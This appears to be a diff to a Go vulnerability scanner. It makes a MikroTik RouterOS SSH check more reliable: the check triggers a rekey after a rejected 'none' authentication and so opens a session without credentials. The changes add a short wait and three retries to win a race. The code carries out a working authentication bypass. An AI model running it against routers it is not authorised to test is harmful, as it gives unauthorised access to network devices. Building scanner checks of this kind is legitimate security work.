@@ -54,16 +54,9 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 			})
 		if rekey {
 			// Trigger a client-requested rekey while the rejected "none" auth
-			// leaves the username pending (incomplete userauth state). Packets
-			// written afterwards (the channel open) are queued by the transport
-			// and flushed once the rekey completes.
+			// leaves the username pending (incomplete userauth state).
 			o = o.WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
-				if err := uac.RequestKeyExchange(); err != nil {
-					conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
-					return err
-				}
-				conf.Logger.Tracef("%s %s pre-auth rekey requested", addr, tname)
-				return nil
+				return mikrotikRequestRekey(addr, conf, tname, uac)
 			})
 		}
 		// ssh.None() is rejected as expected; IgnoreAuthError keeps the
@@ -71,9 +64,19 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 		return auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
 	}
 
-	res := run(true)
+	// The rekey/channel-open ordering is racy, so retry the positive probe a
+	// few times before concluding the server is not vulnerable.
+	var res *auth.AuthResult
+	for attempt := 1; attempt <= 3; attempt++ {
+		res = run(true)
+		if res.Stage == "session" {
+			break
+		}
+		conf.Logger.Debugf("%s %s attempt %d did not open a pre-auth session after rekey (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
+		time.Sleep(time.Second)
+	}
 	if res.Stage != "session" {
-		conf.Logger.Debugf("%s %s did not open a pre-auth session after rekey (stage %s): %v", addr, tname, res.Stage, res.Error)
+		conf.Logger.Debugf("%s %s did not open a pre-auth session after rekey: %v", addr, tname, res.Error)
 		return nil
 	}
 
@@ -139,4 +142,20 @@ func mikrotikParseRouterOSVersion(output string) string {
 		return ""
 	}
 	return m[1]
+}
+
+// mikrotikRequestRekey triggers a client-requested rekey and waits briefly for
+// the transport's kex goroutine to send KEXINIT. The wait ensures the channel
+// open that follows is queued during the rekey (or written after it completes)
+// rather than racing ahead of it; if the channel open is written first, the
+// still-authenticated server rejects it before the rekey can reset its userauth
+// state, which is the intermittent "ssh: disconnect, reason 2" failure mode.
+func mikrotikRequestRekey(addr string, conf *ScanConfig, tname string, uac *ssh.UnauthClientConn) error {
+	if err := uac.RequestKeyExchange(); err != nil {
+		conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
+		return err
+	}
+	time.Sleep(100 * time.Millisecond)
+	conf.Logger.Tracef("%s %s pre-auth rekey requested", addr, tname)
+	return nil
 }
